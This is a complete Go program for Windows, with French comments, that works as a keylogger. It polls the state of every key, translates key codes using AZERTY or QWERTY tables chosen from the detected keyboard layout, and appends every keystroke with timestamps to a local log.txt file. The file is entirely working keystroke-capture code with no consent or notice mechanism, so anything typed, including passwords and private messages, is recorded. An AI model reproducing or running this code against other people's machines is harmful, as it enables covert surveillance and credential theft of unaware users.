package main

import (
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"unicode"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

var (
	logger      *log.Logger
	isRunning   bool
	lastKeyTime time.Time
	keyLayout   string
	//CHAR pour clavier qwerty
	qwertyKeys = map[int]map[bool]string{
		48: {false: "0", true: ")"}, // Code ASCII du chiffre '0'
		49: {false: "1", true: "!"}, // Code ASCII du chiffre '1'
		50: {false: "2", true: "@"}, // Code ASCII du chiffre '2'
		51: {false: "3", true: "#"}, // Code ASCII du chiffre '3'
		52: {false: "4", true: "$"}, // Code ASCII du chiffre '4'
		53: {false: "5", true: "%"}, // Code ASCII du chiffre '5'
		54: {false: "6", true: "^"}, // Code ASCII du chiffre '6'
		55: {false: "7", true: "&"}, // Code ASCII du chiffre '7'
		56: {false: "8", true: "*"}, // Code ASCII du chiffre '8'
		57: {false: "9", true: "("}, // Code ASCII du chiffre '9'
		33: {false: "!", true: "!"}, // Code ASCII du caractère '!'
		64: {false: "@", true: "@"}, // Code ASCII du caractère '@'
		35: {false: "#", true: "#"}, // Code ASCII du caractère '#'
		36: {false: "$", true: "$"}, // Code ASCII du caractère '$'
		37: {false: "%", true: "%"}, // Code ASCII du caractère '%'
		94: {false: "^", true: "^"}, // Code ASCII du caractère '^'
		38: {false: "&", true: "&"}, // Code ASCII du caractère '&'
		42: {false: "*", true: "*"}, // Code ASCII du caractère '*'
		40: {false: "(", true: "("}, // Code ASCII du caractère '('
		41: {false: ")", true: ")"}, // Code ASCII du caractère ')'
	}
	//CHAR pour clavier azerty
	azertyKeys = map[int]map[bool]string{
		48: {false: "°", true: "0"},  // Code ASCII du chiffre '0'
		49: {false: "&", true: "1"},  // Code ASCII du chiffre '1'
		50: {false: "é", true: "2"},  // Code ASCII du chiffre '2'
		51: {false: "\"", true: "3"}, // Code ASCII du chiffre '3'
		52: {false: "'", true: "4"},  // Code ASCII du chiffre '4'
		53: {false: "(", true: "5"},  // Code ASCII du chiffre '5'
		54: {false: "-", true: "6"},  // Code ASCII du chiffre '6'
		55: {false: "è", true: "7"},  // Code ASCII du chiffre '7'
		56: {false: "_", true: "8"},  // Code ASCII du chiffre '8'
		57: {false: "ç", true: "9"},  // Code ASCII du chiffre '9'
		33: {false: "1", true: "!"},  // Code ASCII du caractère '!'
		64: {false: "2", true: "@"},  // Code ASCII du caractère '@'
		35: {false: "3", true: "#"},  // Code ASCII du caractère '#'
		36: {false: "4", true: "$"},  // Code ASCII du caractère '$'
		37: {false: "5", true: "%"},  // Code ASCII du caractère '%'
		94: {false: "6", true: "^"},  // Code ASCII du caractère '^'
		38: {false: "7", true: "&"},  // Code ASCII du caractère '&'
		42: {false: "8", true: "*"},  // Code ASCII du caractère '*'
		40: {false: "9", true: "("},  // Code ASCII du caractère '('
		41: {false: "0", true: ")"},  // Code ASCII du caractère ')'
		//Autre si bug .....
		188: {false: ",", true: "?"},
		190: {false: ";", true: "."},
		191: {false: ":", true: "/"},
		223: {false: "!", true: "§"},
		192: {false: "ù", true: "%"},
		220: {false: "*", true: "µ"},
		221: {false: "^", true: "¨"},
		186: {false: "$", true: "£"},
		219: {false: ")", true: "°"},
		187: {false: "=", true: "+"},
	}
	//CHAR spéciaux commun au deux clavier
	specialKeys = map[int]string{
		w32.VK_RETURN:  "<Enter>",
		w32.VK_SPACE:   "<Space>",
		w32.VK_TAB:     "<Tab>",
		w32.VK_DELETE:  "<Suppr>",
		w32.VK_LEFT:    "<Left>",
		w32.VK_RIGHT:   "<Right>",
		w32.VK_UP:      "<Up>",
		w32.VK_DOWN:    "<Down>",
		w32.VK_CONTROL: "<Ctrl>",
		w32.VK_MENU:    "<Alt>",
		w32.VK_SHIFT:   "<Maj>",
		w32.VK_LWIN:    "<Win>",
		w32.VK_RWIN:    "<Win>",
		w32.VK_ESCAPE:  "<Échap>",
		w32.VK_BACK:    "<Backspace>",
		w32.VK_CAPITAL: "<Caps Lock>",
	}
)

const (
	KEYBOARDLAYOUT_NAMELENGTH = 9 //buffer du nom du clavier
)

func main() {
	// Ouvrir le fichier log en mode création et ajout
	file, err := os.OpenFile("log.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal("Erreur lors de l'ouverture du fichier log :", err)
	}
	defer file.Close()

	// Créer un logger pour écrire dans le fichier log.txt
	logger = log.New(file, "", 0)

	// Écrire l'événement "début lecture" dans le fichier log
	logger.Println("Début lecture -", time.Now().Format(time.Stamp))

	// Obtenir la disposition du clavier
	keyLayout = getKeyboardLayout()

	// Démarrer la goroutine pour enregistrer les événements du clavier
	go recordEvents()

	// Attendre un signal d'interruption pour arrêter le programme proprement
	waitForInterrupt()
}

func getKeyboardLayout() string {
	user32 := syscall.NewLazyDLL("user32.dll")
	getKeyboardLayoutName := user32.NewProc("GetKeyboardLayoutNameW")

	var buf [KEYBOARDLAYOUT_NAMELENGTH]uint16
	_, _, _ = getKeyboardLayoutName.Call(uintptr(unsafe.Pointer(&buf[0])))

	layoutName := syscall.UTF16ToString(buf[:])

	logger.Println("Disposition du clavier:", layoutName)

	return layoutName
}

func recordEvents() {
	isRunning = true //Bool d'échapement
	previousState := make([]uint16, 256)

	for {
		if isRunning {
			// Détecter les événements du clavier
			for key := 0; key < 256; key++ {
				state := w32.GetAsyncKeyState(key)
				if state&0x8000 != 0 && previousState[key]&0x8000 == 0 {
					// Vérifier si l'événement est une touche du clavier
					if isKeyboardEvent(key) {
						// Vérifier l'intervalle entre deux touches
						now := time.Now()
						interval := now.Sub(lastKeyTime)
						if interval > 5*time.Minute { //si l'intevalle > 5 minute
							// Écrire l'événement "début lecture" dans le fichier log
							logger.Println("Début lecture -", now.Format(time.Stamp))
						}
						lastKeyTime = now

						// Récupérer la chaîne représentant la touche spéciale, le cas échéant
						keyString := getKeyString(key, isShiftKeyPressed())

						// Enregistrer l'événement du clavier dans le fichier log.txt
						logger.Printf("Touche pressée : %s ", keyString)
					}
					time.Sleep(20 * time.Millisecond) // Attendre un court instant pour éviter les répétitions rapides des touches
				}
				previousState[key] = state
			}
		}

		time.Sleep(20 * time.Millisecond)
	}
}

func isKeyboardEvent(key int) bool {
	// Exclure les touches de la souris
	excludedKeys := []int{
		w32.VK_LBUTTON, w32.VK_RBUTTON, w32.VK_MBUTTON,
		w32.VK_XBUTTON1, w32.VK_XBUTTON2,
	}

	for _, excludedKey := range excludedKeys {
		if key == excludedKey {
			return false
		}
	}

	return true
}

func isShiftKeyPressed() bool {
	state := w32.GetAsyncKeyState(w32.VK_SHIFT)
	return state&0x8000 != 0
}

func getKeyString(key int, isShiftKeyPressed bool) string {
	// Vérifier si la touche est une touche spéciale
	if val, ok := specialKeys[key]; ok {
		return val
	}
	// Vérifier si c'est une lettre
	if unicode.IsLetter(rune(key)) {
		if isShiftKeyPressed {
			return string(rune(key))
		}
		return strings.ToLower(string(rune(key)))
	}

	// Vérifier la disposition du clavier
	if keyLayout == "0000040C" {
		// Disposition en AZERTY
		if val, ok := azertyKeys[key]; ok {
			if isShiftKeyPressed {
				return val[true] //si maj actif
			}
			return val[false] // si maj non actif
		}
	} else {
		// Disposition en QWERTY
		if val, ok := qwertyKeys[key]; ok {
			if isShiftKeyPressed {
				return val[true] //si maj actif
			}
			return val[false] // si maj non actif
		}
	}

	// Touche non spéciale, convertir en rune
	return string(rune(key))
}

func waitForInterrupt() {
	// Capturer le signal d'interruption (CTRL+C, SIGINT)
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt, syscall.SIGTERM)
	<-signalChan

	// Arrêter l'enregistrement des événements du clavier et quitter le programme
	isRunning = false
	os.Exit(0)
}
